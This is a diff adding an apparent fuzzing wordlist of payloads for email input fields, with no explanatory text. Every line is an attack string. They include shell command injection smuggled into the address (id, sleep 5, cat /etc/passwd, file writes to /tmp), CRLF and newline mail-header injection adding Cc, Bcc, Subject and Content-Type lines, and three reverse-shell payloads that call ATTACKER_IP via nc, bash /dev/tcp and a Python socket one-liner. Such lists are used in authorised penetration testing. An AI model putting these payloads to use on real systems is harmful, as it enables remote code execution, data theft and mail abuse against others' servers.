@@ -1,2 +1,52 @@
-test@test.com|id
-test@test.com;id
+test@test.com; id
+test@test.com | id
+test@test.com`id`
+test@test.com$(id)
+test@test.com&&id
+test@test.com||id
+test@test.com
+id
+test@test.com%0aid
+test@test.com%0d%0aid
+test@test.com%0aCc: attacker@test.com
+test@test.com
+Cc: attacker@test.com
+test@test.com
+Bcc: attacker@test.com
+"test@test.com"; id
+'test@test.com'; id
+test@test.com; cat /etc/passwd
+test@test.com | cat /etc/passwd
+test+'; id; #@test.com
+test'+'; id; #@test.com
+test"'; id; #@test.com
+; id; user@test.com
+| id; user@test.com
+`id`@test.com
+$(id)@test.com
+$(sleep 5)@test.com
+test@$(id).com
+test@`id`.com
+test@test.com; sleep 5
+test@test.com | sleep 5
+test@test.com`sleep 5`
+test@test.com$(sleep 5)
+test@test.com && sleep 5
+test@test.com || sleep 5
+test@test.com%0asleep%205
+"test@test.com"
+Cc: evil@attacker.com
+test@test.com
+Subject: injected
+test@test.com
+Content-Type: text/html
+test@test.com
+X-Header: injection
+test@test.com;id>>/tmp/x
+test@test.com;id>&2
+test@test.com;id>/dev/null
+test@test.com;echo 1>/tmp/test
+admin@test.com; id #
+user@test.com; nc -e /bin/bash ATTACKER_IP 4444
+user@test.com; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+user@test.com; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
